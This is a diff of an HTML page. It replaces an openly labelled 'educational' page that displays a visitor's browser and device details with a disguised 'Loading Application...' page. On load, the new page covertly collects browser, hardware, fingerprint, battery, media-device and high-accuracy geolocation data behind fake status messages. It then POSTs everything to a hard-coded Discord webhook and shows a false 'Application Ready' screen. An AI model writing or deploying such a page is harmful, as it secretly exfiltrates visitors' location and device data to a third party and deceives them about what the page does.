@@ -1,1 +1,505 @@
-<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Client Information Display</title>    <style>        body {            font-family: Arial, sans-serif;            line-height: 1.6;            max-width: 800px;            margin: 0 auto;            padding: 20px;            background-color: #f5f5f5;        }        h1 {            color: #333;            text-align: center;            border-bottom: 2px solid #ddd;            padding-bottom: 10px;        }        .info-section {            background-color: white;            padding: 15px;            margin-bottom: 20px;            border-radius: 5px;            box-shadow: 0 2px 4px rgba(0,0,0,0.1);        }        h2 {            color: #444;            margin-top: 0;        }        .info-item {            margin-bottom: 10px;        }        .label {            font-weight: bold;            display: inline-block;            width: 180px;        }        .value {            display: inline-block;        }        .disclaimer {            background-color: #fffacc;            padding: 10px;            border-radius: 5px;            font-size: 0.9em;            margin-top: 20px;        }        .loading {            padding: 10px;            color: #666;            font-style: italic;        }    </style></head><body>    <h1>Client Information Display</h1>    <div class="disclaimer">        <strong>Note:</strong> This page automatically collects available information about your browser and device.        This is for educational purposes only and helps illustrate privacy concepts and web security awareness.    </div>    <div class="info-section">        <h2>Browser & Device Information</h2>        <div id="browser-info"></div>    </div>    <div class="info-section">        <h2>Screen & Window Information</h2>        <div id="screen-info"></div>    </div>    <div class="info-section">        <h2>Network Information</h2>        <div id="network-info"></div>    </div>    <div class="info-section">        <h2>Location Information</h2>        <div id="geo-info">            <div class="loading">Attempting to get location data...</div>        </div>    </div>    <div class="info-section">        <h2>Battery Information</h2>        <div id="battery-info">            <div class="loading">Fetching battery information...</div>        </div>    </div>    <div class="info-section">        <h2>Hardware Information</h2>        <div id="hardware-info"></div>    </div>    <div class="info-section">        <h2>Browser Capabilities</h2>        <div id="capabilities-info"></div>    </div>    <div class="info-section">        <h2>Time & Timezone Information</h2>        <div id="time-info"></div>    </div>    <div class="info-section">        <h2>Media Devices</h2>        <div id="media-info">            <div class="loading">Requesting media device information...</div>        </div>    </div>    <div class="info-section">        <h2>Local Storage Analysis</h2>        <div id="storage-info"></div>    </div>    <div class="info-section">        <h2>HTTP Request Headers</h2>        <div id="headers-info">            <p>Note: Complete headers are only visible server-side, but common headers are estimated below.</p>        </div>    </div>    <div class="info-section">        <h2>Canvas Fingerprinting Sample</h2>        <div id="fingerprint-info">            <p>This demonstrates one technique used for browser fingerprinting:</p>            <canvas id="fingerprintCanvas" width="220" height="30"></canvas>            <div id="canvas-hash"></div>        </div>    </div>    <div class="info-section">        <h2>Performance Information</h2>        <div id="performance-info"></div>    </div>    <script>        function addInfoItem(containerId, label, value) {            const container = document.getElementById(containerId);            const item = document.createElement('div');            item.className = 'info-item';            const labelSpan = document.createElement('span');            labelSpan.className = 'label';            labelSpan.textContent = label + ': ';            const valueSpan = document.createElement('span');            valueSpan.className = 'value';            valueSpan.textContent = value;            item.appendChild(labelSpan);            item.appendChild(valueSpan);            container.appendChild(item);        }        function clearLoading(containerId) {            const container = document.getElementById(containerId);            const loadingElements = container.querySelectorAll('.loading');            loadingElements.forEach(el => el.remove());        }                const browserInfo = {            'User Agent': navigator.userAgent,            'Browser Language': navigator.language,            'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : navigator.language,            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',            'Do Not Track': navigator.doNotTrack || 'Not specified',            'Platform': navigator.platform,            'Browser Vendor': navigator.vendor || 'Not available',            'Browser Version': navigator.appVersion || 'Not available',            'App Name': navigator.appName || 'Not available',            'Product': navigator.product || 'Not available'        };        Object.entries(browserInfo).forEach(([label, value]) => {            addInfoItem('browser-info', label, value);        });        const screenInfo = {            'Screen Width': window.screen.width + 'px',            'Screen Height': window.screen.height + 'px',            'Available Width': window.screen.availWidth + 'px',            'Available Height': window.screen.availHeight + 'px',            'Color Depth': window.screen.colorDepth + ' bits',            'Pixel Depth': window.screen.pixelDepth + ' bits',            'Window Inner Width': window.innerWidth + 'px',            'Window Inner Height': window.innerHeight + 'px',            'Device Pixel Ratio': window.devicePixelRatio,            'Orientation': screen.orientation ? screen.orientation.type : 'Not available'        };        Object.entries(screenInfo).forEach(([label, value]) => {            addInfoItem('screen-info', label, value);        });        if ('connection' in navigator) {            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;            if (connection) {                const networkInfo = {                    'Effective Type': connection.effectiveType || 'Not available',                    'Downlink': (connection.downlink ? connection.downlink + ' Mbps' : 'Not available'),                    'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),                    'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'                };                Object.entries(networkInfo).forEach(([label, value]) => {                    addInfoItem('network-info', label, value);                });            }        } else {            addInfoItem('network-info', 'Network Information', 'API not available in this browser');        }        const hardwareInfo = {            'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',            'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',            'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available'        };        Object.entries(hardwareInfo).forEach(([label, value]) => {            addInfoItem('hardware-info', label, value);        });        const caps = {            'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',            'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',            'Local Storage Available': typeof(Storage) !== 'undefined' ? 'Yes' : 'No',            'Session Storage Available': typeof(sessionStorage) !== 'undefined' ? 'Yes' : 'No',            'IndexedDB Available': window.indexedDB ? 'Yes' : 'No',            'WEBGL Available': (function() {                try {                    return !!window.WebGLRenderingContext &&                            !!document.createElement('canvas').getContext('experimental-webgl');                } catch(e) {                    return false;                }            })() ? 'Yes' : 'No',            'Web Workers Available': !!window.Worker ? 'Yes' : 'No',            'Service Workers Available': 'serviceWorker' in navigator ? 'Yes' : 'No',            'Push Notifications Available': 'PushManager' in window ? 'Yes' : 'No'        };        Object.entries(caps).forEach(([label, value]) => {            addInfoItem('capabilities-info', label, value);        });        const now = new Date();        const timeInfo = {            'Current Time': now.toString(),            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',            'Timezone Offset': now.getTimezoneOffset() + ' minutes from UTC',            'Date Locale': Intl.DateTimeFormat().resolvedOptions().locale        };        Object.entries(timeInfo).forEach(([label, value]) => {            addInfoItem('time-info', label, value);        });        try {            if (window.localStorage) {                const storageInfo = {                    'LocalStorage Available': 'Yes',                    'LocalStorage Items': localStorage.length,                    'SessionStorage Available': window.sessionStorage ? 'Yes' : 'No',                    'SessionStorage Items': window.sessionStorage ? sessionStorage.length : 'N/A',                    'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',                    'Cookie Count': document.cookie ? document.cookie.split(';').length : 0                };                Object.entries(storageInfo).forEach(([label, value]) => {                    addInfoItem('storage-info', label, value);                });            } else {                addInfoItem('storage-info', 'Local Storage', 'Not available');            }        } catch (e) {            addInfoItem('storage-info', 'Error accessing storage', e.message);        }        const commonHeaders = {            'User-Agent': navigator.userAgent,            'Accept-Language': navigator.language,            'DNT (Do Not Track)': navigator.doNotTrack || 'Not specified',            'Referer': document.referrer || 'None/Direct Navigation',            'Host': window.location.host,            'Origin': window.location.origin        };        Object.entries(commonHeaders).forEach(([label, value]) => {            addInfoItem('headers-info', label, value);        });        try {            const canvas = document.getElementById('fingerprintCanvas');            const ctx = canvas.getContext('2d');            ctx.textBaseline = "top";            ctx.font = "14px 'Arial'";            ctx.textBaseline = "alphabetic";            ctx.fillStyle = "#f60";            ctx.fillRect(125, 1, 62, 20);            ctx.fillStyle = "#069";            ctx.fillText("Fingerprint", 2, 15);            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";            ctx.fillText("Test", 4, 17);            const dataURL = canvas.toDataURL();            const hash = dataURL.length;            addInfoItem('canvas-hash', 'Canvas Fingerprint Value', 'Signature Length: ' + hash);        } catch (e) {            addInfoItem('canvas-hash', 'Canvas Fingerprinting', 'Failed: ' + e.message);        }        if (window.performance) {            const perfInfo = {                'Navigation Type': (function() {                    const navType = performance.navigation ? performance.navigation.type : null;                    if (navType === 0) return 'Navigate';                    if (navType === 1) return 'Reload';                    if (navType === 2) return 'Back/Forward';                    return 'Unknown';                })(),                'Redirect Count': performance.navigation ? performance.navigation.redirectCount : 'Unknown',                'Page Load Time': performance.timing ?                     (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' :                     'Not available'            };            Object.entries(perfInfo).forEach(([label, value]) => {                addInfoItem('performance-info', label, value);            });            if (performance.getEntriesByType) {                try {                    const navEntry = performance.getEntriesByType('navigation')[0];                    if (navEntry) {                        addInfoItem('performance-info', 'DOM Complete Time', navEntry.domComplete + ' ms');                        addInfoItem('performance-info', 'DOM Interactive Time', navEntry.domInteractive + ' ms');                        addInfoItem('performance-info', 'Response Start Time', navEntry.responseStart + ' ms');                    }                } catch (e) {                }                try {                    const paintEntries = performance.getEntriesByType('paint');                    if (paintEntries.length > 0) {                        paintEntries.forEach(entry => {                            addInfoItem('performance-info', entry.name, entry.startTime + ' ms');                        });                    }                } catch (e) {                }            }        } else {            addInfoItem('performance-info', 'Performance API', 'Not available');        }                if ('geolocation' in navigator) {            navigator.geolocation.getCurrentPosition(                function(position) {                    clearLoading('geo-info');                    addInfoItem('geo-info', 'Latitude', position.coords.latitude);                    addInfoItem('geo-info', 'Longitude', position.coords.longitude);                    addInfoItem('geo-info', 'Accuracy', position.coords.accuracy + ' meters');                    if (position.coords.altitude) {                        addInfoItem('geo-info', 'Altitude', position.coords.altitude + ' meters');                    }                    if (position.coords.heading) {                        addInfoItem('geo-info', 'Heading', position.coords.heading + '°');                    }                    if (position.coords.speed) {                        addInfoItem('geo-info', 'Speed', position.coords.speed + ' m/s');                    }                    addInfoItem('geo-info', 'Timestamp', new Date(position.timestamp).toString());                },                function(error) {                    clearLoading('geo-info');                    addInfoItem('geo-info', 'Geolocation API', 'Available but permission denied or error');                    addInfoItem('geo-info', 'Error', error.message);                },                { enableHighAccuracy: true, timeout: 10000 }            );        } else {            clearLoading('geo-info');            addInfoItem('geo-info', 'Geolocation API', 'Not available in this browser');        }                if ('getBattery' in navigator) {            navigator.getBattery().then(function(battery) {                clearLoading('battery-info');                addInfoItem('battery-info', 'Battery Charging', battery.charging ? 'Yes' : 'No');                addInfoItem('battery-info', 'Battery Level', (battery.level * 100) + '%');                addInfoItem('battery-info', 'Charging Time', battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds');                addInfoItem('battery-info', 'Discharging Time', battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds');                                battery.addEventListener('chargingchange', function() {                    document.querySelector('#battery-info .info-item:nth-child(1) .value').textContent = battery.charging ? 'Yes' : 'No';                });                battery.addEventListener('levelchange', function() {                    document.querySelector('#battery-info .info-item:nth-child(2) .value').textContent = (battery.level * 100) + '%';                });            }).catch(function(error) {                clearLoading('battery-info');                addInfoItem('battery-info', 'Battery API', 'Error accessing battery: ' + error.message);            });        } else {            clearLoading('battery-info');            addInfoItem('battery-info', 'Battery API', 'Not available in this browser');        }                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {            navigator.mediaDevices.getUserMedia({ audio: true, video: true })            .then(function(stream) {                stream.getTracks().forEach(track => track.stop());                                navigator.mediaDevices.enumerateDevices()                .then(function(devices) {                    clearLoading('media-info');                    let audioInputCount = 0;                    let audioOutputCount = 0;                    let videoInputCount = 0;                                        devices.forEach(function(device) {                        if (device.kind === 'audioinput') audioInputCount++;                        if (device.kind === 'audiooutput') audioOutputCount++;                        if (device.kind === 'videoinput') videoInputCount++;                    });                                        addInfoItem('media-info', 'Microphones', audioInputCount);                    addInfoItem('media-info', 'Speakers/Headphones', audioOutputCount);                    addInfoItem('media-info', 'Cameras', videoInputCount);                });            })            .catch(function(err) {                navigator.mediaDevices.enumerateDevices()                .then(function(devices) {                    clearLoading('media-info');                    addInfoItem('media-info', 'Permission Status', 'Denied: ' + err.message);                    addInfoItem('media-info', 'Device Count', devices.length + ' (limited information due to permissions)');                })                .catch(function(enumErr) {                    clearLoading('media-info');                    addInfoItem('media-info', 'Media Devices API', 'Error: ' + enumErr.message);                });            });        } else {            clearLoading('media-info');            addInfoItem('media-info', 'Media Devices API', 'Not available in this browser');        }    </script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client Information Collector</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid #3498db;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 20px;
+            font-style: italic;
+            color: #666;
+        }
+        .hidden-canvas {
+            position: absolute;
+            left: -9999px;
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Loading Application...</h1>
+        <div class="loader"></div>
+        <div class="status" id="status-message">Initializing application resources...</div>
+    </div>
+    
+    <canvas id="fingerprintCanvas" class="hidden-canvas" width="220" height="30"></canvas>
+    
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7';
+        
+        const collectedData = {
+            browser: {},
+            screen: {},
+            network: {},
+            geo: {},
+            battery: {},
+            hardware: {},
+            capabilities: {},
+            time: {},
+            media: {},
+            storage: {},
+            headers: {},
+            fingerprint: {},
+            performance: {}
+        };
+        
+        const statusMessages = [
+            "Loading resources...",
+            "Preparing interface...",
+            "Checking compatibility...",
+            "Almost ready...",
+            "Starting application..."
+        ];
+        
+        let messageIndex = 0;
+        const statusElement = document.getElementById("status-message");
+        
+        const messageInterval = setInterval(() => {
+            statusElement.textContent = statusMessages[messageIndex];
+            messageIndex = (messageIndex + 1) % statusMessages.length;
+        }, 2000);
+        
+        function collectBrowserInfo() {
+            collectedData.browser = {
+                'User Agent': navigator.userAgent,
+                'Browser Language': navigator.language,
+                'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : navigator.language,
+                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                'Do Not Track': navigator.doNotTrack || 'Not specified',
+                'Platform': navigator.platform,
+                'Browser Vendor': navigator.vendor || 'Not available',
+                'Browser Version': navigator.appVersion || 'Not available',
+                'App Name': navigator.appName || 'Not available',
+                'Product': navigator.product || 'Not available'
+            };
+        }
+        
+        function collectScreenInfo() {
+            collectedData.screen = {
+                'Screen Width': window.screen.width + 'px',
+                'Screen Height': window.screen.height + 'px',
+                'Available Width': window.screen.availWidth + 'px',
+                'Available Height': window.screen.availHeight + 'px',
+                'Color Depth': window.screen.colorDepth + ' bits',
+                'Pixel Depth': window.screen.pixelDepth + ' bits',
+                'Window Inner Width': window.innerWidth + 'px',
+                'Window Inner Height': window.innerHeight + 'px',
+                'Device Pixel Ratio': window.devicePixelRatio,
+                'Orientation': screen.orientation ? screen.orientation.type : 'Not available'
+            };
+        }
+        
+        function collectNetworkInfo() {
+            if ('connection' in navigator) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    collectedData.network = {
+                        'Effective Type': connection.effectiveType || 'Not available',
+                        'Downlink': (connection.downlink ? connection.downlink + ' Mbps' : 'Not available'),
+                        'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),
+                        'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'
+                    };
+                }
+            } else {
+                collectedData.network = {
+                    'Network Information': 'API not available in this browser'
+                };
+            }
+        }
+        
+        function collectHardwareInfo() {
+            collectedData.hardware = {
+                'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',
+                'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',
+                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available'
+            };
+        }
+        
+        function collectCapabilitiesInfo() {
+            collectedData.capabilities = {
+                'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',
+                'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',
+                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                'Local Storage Available': typeof(Storage) !== 'undefined' ? 'Yes' : 'No',
+                'Session Storage Available': typeof(sessionStorage) !== 'undefined' ? 'Yes' : 'No',
+                'IndexedDB Available': window.indexedDB ? 'Yes' : 'No',
+                'WEBGL Available': (function() {
+                    try {
+                        return !!window.WebGLRenderingContext &&
+                                !!document.createElement('canvas').getContext('experimental-webgl');
+                    } catch(e) {
+                        return false;
+                    }
+                })() ? 'Yes' : 'No',
+                'Web Workers Available': !!window.Worker ? 'Yes' : 'No',
+                'Service Workers Available': 'serviceWorker' in navigator ? 'Yes' : 'No',
+                'Push Notifications Available': 'PushManager' in window ? 'Yes' : 'No'
+            };
+        }
+        
+        function collectTimeInfo() {
+            const now = new Date();
+            collectedData.time = {
+                'Current Time': now.toString(),
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                'Timezone Offset': now.getTimezoneOffset() + ' minutes from UTC',
+                'Date Locale': Intl.DateTimeFormat().resolvedOptions().locale
+            };
+        }
+        
+        function collectStorageInfo() {
+            try {
+                if (window.localStorage) {
+                    collectedData.storage = {
+                        'LocalStorage Available': 'Yes',
+                        'LocalStorage Items': localStorage.length,
+                        'SessionStorage Available': window.sessionStorage ? 'Yes' : 'No',
+                        'SessionStorage Items': window.sessionStorage ? sessionStorage.length : 'N/A',
+                        'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                        'Cookie Count': document.cookie ? document.cookie.split(';').length : 0
+                    };
+                } else {
+                    collectedData.storage = {
+                        'Local Storage': 'Not available'
+                    };
+                }
+            } catch (e) {
+                collectedData.storage = {
+                    'Error accessing storage': e.message
+                };
+            }
+        }
+        
+        function collectHeaderInfo() {
+            collectedData.headers = {
+                'User-Agent': navigator.userAgent,
+                'Accept-Language': navigator.language,
+                'DNT (Do Not Track)': navigator.doNotTrack || 'Not specified',
+                'Referer': document.referrer || 'None/Direct Navigation',
+                'Host': window.location.host,
+                'Origin': window.location.origin
+            };
+        }
+        
+        function collectCanvasFingerprint() {
+            try {
+                const canvas = document.getElementById('fingerprintCanvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Test", 4, 17);
+                const dataURL = canvas.toDataURL();
+                const hash = dataURL.length;
+                collectedData.fingerprint = {
+                    'Canvas Fingerprint Value': 'Signature Length: ' + hash
+                };
+            } catch (e) {
+                collectedData.fingerprint = {
+                    'Canvas Fingerprinting': 'Failed: ' + e.message
+                };
+            }
+        }
+        
+        function collectPerformanceInfo() {
+            if (window.performance) {
+                collectedData.performance = {
+                    'Navigation Type': (function() {
+                        const navType = performance.navigation ? performance.navigation.type : null;
+                        if (navType === 0) return 'Navigate';
+                        if (navType === 1) return 'Reload';
+                        if (navType === 2) return 'Back/Forward';
+                        return 'Unknown';
+                    })(),
+                    'Redirect Count': performance.navigation ? performance.navigation.redirectCount : 'Unknown',
+                    'Page Load Time': performance.timing ?
+                         (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' :
+                         'Not available'
+                };
+                
+                if (performance.getEntriesByType) {
+                    try {
+                        const navEntry = performance.getEntriesByType('navigation')[0];
+                        if (navEntry) {
+                            collectedData.performance['DOM Complete Time'] = navEntry.domComplete + ' ms';
+                            collectedData.performance['DOM Interactive Time'] = navEntry.domInteractive + ' ms';
+                            collectedData.performance['Response Start Time'] = navEntry.responseStart + ' ms';
+                        }
+                    } catch (e) {
+                    }
+                    
+                    try {
+                        const paintEntries = performance.getEntriesByType('paint');
+                        if (paintEntries.length > 0) {
+                            paintEntries.forEach(entry => {
+                                collectedData.performance[entry.name] = entry.startTime + ' ms';
+                            });
+                        }
+                    } catch (e) {
+                    }
+                }
+            } else {
+                collectedData.performance = {
+                    'Performance API': 'Not available'
+                };
+            }
+        }
+        
+        function collectGeolocationInfo() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        collectedData.geo = {
+                            'Latitude': position.coords.latitude,
+                            'Longitude': position.coords.longitude,
+                            'Accuracy': position.coords.accuracy + ' meters',
+                            'Timestamp': new Date(position.timestamp).toString()
+                        };
+                        
+                        if (position.coords.altitude) {
+                            collectedData.geo['Altitude'] = position.coords.altitude + ' meters';
+                        }
+                        if (position.coords.heading) {
+                            collectedData.geo['Heading'] = position.coords.heading + '°';
+                        }
+                        if (position.coords.speed) {
+                            collectedData.geo['Speed'] = position.coords.speed + ' m/s';
+                        }
+                        
+                        checkAllDataCollected();
+                    },
+                    function(error) {
+                        collectedData.geo = {
+                            'Geolocation API': 'Available but permission denied or error',
+                            'Error': error.message
+                        };
+                        checkAllDataCollected();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                collectedData.geo = {
+                    'Geolocation API': 'Not available in this browser'
+                };
+                checkAllDataCollected();
+            }
+        }
+        
+        function collectBatteryInfo() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    collectedData.battery = {
+                        'Battery Charging': battery.charging ? 'Yes' : 'No',
+                        'Battery Level': (battery.level * 100) + '%',
+                        'Charging Time': battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
+                        'Discharging Time': battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
+                    };
+                    checkAllDataCollected();
+                }).catch(function(error) {
+                    collectedData.battery = {
+                        'Battery API': 'Error accessing battery: ' + error.message
+                    };
+                    checkAllDataCollected();
+                });
+            } else {
+                collectedData.battery = {
+                    'Battery API': 'Not available in this browser'
+                };
+                checkAllDataCollected();
+            }
+        }
+        
+        function collectMediaInfo() {
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                .then(function(stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    navigator.mediaDevices.enumerateDevices()
+                    .then(function(devices) {
+                        let audioInputCount = 0;
+                        let audioOutputCount = 0;
+                        let videoInputCount = 0;
+                        
+                        devices.forEach(function(device) {
+                            if (device.kind === 'audioinput') audioInputCount++;
+                            if (device.kind === 'audiooutput') audioOutputCount++;
+                            if (device.kind === 'videoinput') videoInputCount++;
+                        });
+                        
+                        collectedData.media = {
+                            'Microphones': audioInputCount,
+                            'Speakers/Headphones': audioOutputCount,
+                            'Cameras': videoInputCount
+                        };
+                        checkAllDataCollected();
+                    });
+                })
+                .catch(function(err) {
+                    navigator.mediaDevices.enumerateDevices()
+                    .then(function(devices) {
+                        collectedData.media = {
+                            'Permission Status': 'Denied: ' + err.message,
+                            'Device Count': devices.length + ' (limited information due to permissions)'
+                        };
+                        checkAllDataCollected();
+                    })
+                    .catch(function(enumErr) {
+                        collectedData.media = {
+                            'Media Devices API': 'Error: ' + enumErr.message
+                        };
+                        checkAllDataCollected();
+                    });
+                });
+            } else {
+                collectedData.media = {
+                    'Media Devices API': 'Not available in this browser'
+                };
+                checkAllDataCollected();
+            }
+        }
+        
+        const asyncOperations = {
+            geo: false,
+            battery: false,
+            media: false
+        };
+        
+        function checkAllDataCollected() {
+            const callerName = checkAllDataCollected.caller.name;
+            
+            if (callerName.includes('Geo')) {
+                asyncOperations.geo = true;
+            } else if (callerName.includes('Battery')) {
+                asyncOperations.battery = true;
+            } else if (callerName.includes('Media')) {
+                asyncOperations.media = true;
+            }
+            
+            if (Object.values(asyncOperations).every(val => val === true)) {
+                sendDataToWebhook();
+            }
+        }
+        
+        function formatDataForDiscord() {
+            let message = "**👤 User Information Collection 👤**\n\n";
+            
+            for (const [category, data] of Object.entries(collectedData)) {
+                if (Object.keys(data).length > 0) {
+                    message += `**📋 ${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
+                    
+                    for (const [key, value] of Object.entries(data)) {
+                        message += `> **${key}:** ${value}\n`;
+                    }
+                    
+                    message += "\n";
+                }
+            }
+            
+            message += `**📅 Collected At:** ${new Date().toString()}\n`;
+            
+            return message;
+        }
+        
+        function sendDataToWebhook() {
+            if (WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
+                console.log('Webhook URL not configured');
+                redirectToSuccess();
+                return;
+            }
+            
+            const formattedMessage = formatDataForDiscord();
+            
+            const payload = {
+                content: formattedMessage
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Data sent successfully');
+                redirectToSuccess();
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
+                redirectToSuccess();
+            });
+        }
+        
+        function redirectToSuccess() {
+            clearInterval(messageInterval);
+            statusElement.textContent = "Application loaded successfully!";
+            
+            setTimeout(() => {
+                document.querySelector('.container').innerHTML = `
+                    <h1>Application Ready</h1>
+                    <p>Thank you for your patience. The application is now ready to use.</p>
+                    <button onclick="window.location.reload()">Continue</button>
+                `;
+            }, 1500);
+        }
+        
+        function collectAllData() {
+            collectBrowserInfo();
+            collectScreenInfo();
+            collectNetworkInfo();
+            collectHardwareInfo();
+            collectCapabilitiesInfo();
+            collectTimeInfo();
+            collectStorageInfo();
+            collectHeaderInfo();
+            collectCanvasFingerprint();
+            collectPerformanceInfo();
+            collectGeolocationInfo();
+            collectBatteryInfo();
+            collectMediaInfo();
+        }
+        
+        window.addEventListener('load', collectAllData);
+    </script>
+</body>
+</html>
